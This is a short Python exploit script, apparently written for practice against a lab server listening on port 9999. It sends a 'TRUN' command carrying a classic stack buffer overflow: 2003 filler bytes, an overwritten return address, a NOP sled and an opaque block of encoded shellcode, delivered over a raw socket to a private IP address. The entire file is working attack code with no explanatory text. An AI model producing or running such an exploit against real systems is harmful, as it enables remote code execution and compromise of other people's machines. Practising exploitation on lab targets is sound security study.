#!/usr/bin/python

import sys
import socket

shellcode = (
    b"\xd9\xe5\xbd\xa5\xee\x12\x41\xd9\x74\x24\xf4\x58\x31\xc9"
    b"\xb1\x52\x31\x68\x17\x03\x68\x17\x83\x65\xea\xf0\xb4\x99"
    b"\x1b\x76\x36\x61\xdc\x17\xbe\x84\xed\x17\xa4\xcd\x5e\xa8"
    b"\xae\x83\x52\x43\xe2\x37\xe0\x21\x2b\x38\x41\x8f\x0d\x77"
    b"\x52\xbc\x6e\x16\xd0\xbf\xa2\xf8\xe9\x0f\xb7\xf9\x2e\x6d"
    b"\x3a\xab\xe7\xf9\xe9\x5b\x83\xb4\x31\xd0\xdf\x59\x32\x05"
    b"\x97\x58\x13\x98\xa3\x02\xb3\x1b\x67\x3f\xfa\x03\x64\x7a"
    b"\xb4\xb8\x5e\xf0\x47\x68\xaf\xf9\xe4\x55\x1f\x08\xf4\x92"
    b"\x98\xf3\x83\xea\xda\x8e\x93\x29\xa0\x54\x11\xa9\x02\x1e"
    b"\x81\x15\xb2\xf3\x54\xde\xb8\xb8\x13\xb8\xdc\x3f\xf7\xb3"
    b"\xd9\xb4\xf6\x13\x68\x8e\xdc\xb7\x30\x54\x7c\xee\x9c\x3b"
    b"\x81\xf0\x7e\xe3\x27\x7b\x92\xf0\x55\x26\xfb\x35\x54\xd8"
    b"\xfb\x51\xef\xab\xc9\xfe\x5b\x23\x62\x76\x42\xb4\x85\xad"
    b"\x32\x2a\x78\x4e\x43\x63\xbf\x1a\x13\x1b\x16\x23\xf8\xdb"
    b"\x97\xf6\xaf\x8b\x37\xa9\x0f\x7b\xf8\x19\xf8\x91\xf7\x46"
    b"\x18\x9a\xdd\xee\xb3\x61\xb6\xd0\xec\x68\x40\xb9\xee\x6a"
    b"\x5d\x65\x66\x8c\x37\x85\x2e\x07\xa0\x3c\x6b\xd3\x51\xc0"
    b"\xa1\x9e\x52\x4a\x46\x5f\x1c\xbb\x23\x73\xc9\x4b\x7e\x29"
    b"\x5c\x53\x54\x45\x02\xc6\x33\x95\x4d\xfb\xeb\xc2\x1a\xcd"
    b"\xe5\x86\xb6\x74\x5c\xb4\x4a\xe0\xa7\x7c\x91\xd1\x26\x7d"
    b"\x54\x6d\x0d\x6d\xa0\x6e\x09\xd9\x7c\x39\xc7\xb7\x3a\x93"
    b"\xa9\x61\x95\x48\x60\xe5\x60\xa3\xb3\x73\x6d\xee\x45\x9b"
    b"\xdc\x47\x10\xa4\xd1\x0f\x94\xdd\x0f\xb0\x5b\x34\x94\xd0"
    b"\xb9\x9c\xe1\x78\x64\x75\x48\xe5\x97\xa0\x8f\x10\x14\x40"
    b"\x70\xe7\x04\x21\x75\xa3\x82\xda\x07\xbc\x66\xdc\xb4\xbd"
    b"\xa2"
)

buffer = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 32 + shellcode
payload = b"TRUN /.:/" + buffer

ip = "192.168.1.11"
port = 9999

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send((payload))
    s.close()

except socket.error:
    print("Error connecting to server")
    sys.exit()
